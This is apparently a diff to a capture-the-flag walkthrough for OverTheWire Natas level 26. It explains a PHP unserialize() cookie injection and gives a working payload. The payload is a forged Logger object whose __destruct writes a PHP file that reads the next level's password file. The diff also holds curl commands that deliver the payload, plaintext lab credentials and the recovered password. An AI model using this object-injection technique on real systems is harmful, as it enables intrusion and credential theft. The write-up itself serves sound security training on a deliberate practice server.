@@ -593,13 +593,60 @@ $ curl -v --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.l
 
 ### Level 26 - PHP exploit with `unserialize()` and `__destruct()`
 ```
-http://natas.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
+http://natas26.natas.labs.overthewire.org/ natas26 oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 ```
 
 During the unserialization of a PHP object, the magic methods `__wakeup()` and `__destruct()` will be called.
 
+Function call order:
+```php
+session_start();
+if cookie drawing OR get x1 x2 y1 y2
+  $imgfile="img/natas26_" . session_id() .".png"; 
+  drawImage($imgfile); 
+    imagecreatetruecolor()
+    drawFromUserdata()
+      if get x1..
+        imagecolorallocate()
+        imageline()
+      if cookie drawing
+        $drawing=unserialize(base64_decode($_COOKIE["drawing"])); // <-- injection l.70
+        imagecolorallocate()
+        imageline()
+    imagepng
+    imagedestroy
+  showImage($imgfile);
+    if file_exists($imgfile)
+      echo <img src="$imgfile"/>
+  storeData();
+    setcookie()
 ```
-O:6:"Logger":3:{s:7:"logFile";s:42:"img/natas26_or2dvtmerjti19ess5r2d7jh20.png";s:7:"initMsg";s:7:"initMsg";s:7:"exitMsg";s:16:"<?php exit(); ?>";}
+
+So in order to get to this code, we juste have to create a cookie with the key `drawing` and a value. Let's try to crash test the app to see if it reacts as exepcted.
+```bash
+# set drawing to "love" and refresh the page
+Notice: unserialize(): Error at offset 0 of 3 bytes in /var/www/natas/natas26/index.php on line 70
+```
+Boom, line 70, that's our vulnerable point.
+
+So we need to create a serialized version of a `Logger` object, with custom `logFile` and `exitMsg` as they will be called in `__destruct()`;
+
+Let's forge our payload in `payload.php`:
+```php
+<?php
+class Logger{
+  private $logFile = "img/hello.php";
+  private $initMsg = "";
+  private $exitMsg = "<?= file_get_contents('/etc/natas_webpass/natas27') ?>";
+}
+$x = new Logger();
+echo base64_encode(serialize($x));
+```
+```php
+$ php payload.php > payload
+$ curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/ -b "drawing=$(cat payload)"
+$ curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/img/hello.php
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
 ```
 
 Reference:
